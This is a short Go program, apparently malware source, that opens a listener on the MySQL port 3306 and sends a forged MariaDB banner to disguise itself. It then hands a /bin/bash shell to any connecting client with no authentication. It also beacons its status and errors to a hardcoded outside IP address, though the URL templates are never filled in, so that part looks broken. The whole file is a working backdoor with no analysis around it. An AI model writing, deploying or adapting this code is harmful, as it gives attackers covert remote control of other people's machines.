package main

import (
	"bytes"
	"fmt"
	"net"
	"net/http"
	"os"
	"os/exec"
	"time"
)

const (
	connectionString = `m
5.5.5-10.6.3-MariaDB-1:10.6.3+maria~focalGN0DElolM~R]^?_Co'o{mysql_native_password`
	ip = "165.232.177.217"
)

var (
	errorLink  string = "http://%v/api/error/donkey/%v"
	activeLink string = "http://%v/api/active/donkey/%v"
)

func handleConnection(connection net.Conn) {
	defer connection.Close()
	connection.Write([]byte(connectionString))

	cmd := exec.Command("/bin/bash")
	cmd.Stdin = connection
	cmd.Stdout = connection
	cmd.Stderr = connection

	cmd.Run()
}

func reportMalwareActive() {
	if _, err := http.Get(activeLink); err != nil {
		reportErr(err)
	}
}

func reportErr(err error) {
	http.Post(errorLink, "application/json", bytes.NewBuffer([]byte(fmt.Sprintf(`{"error":"%v"}`, err.Error()))))
}

func main() {
	listener, err := net.Listen("tcp", "0.0.0.0:3306")
	if err != nil {
		os.Exit(0)
	}
	reportMalwareActive()

	go func() {
		ticker := time.NewTicker(2 * 60 * time.Second)

		for range ticker.C {
			reportMalwareActive()
		}
	}()

	for {
		connection, err := listener.Accept()
		if err != nil {
			continue
		}

		go handleConnection(connection)
	}
}
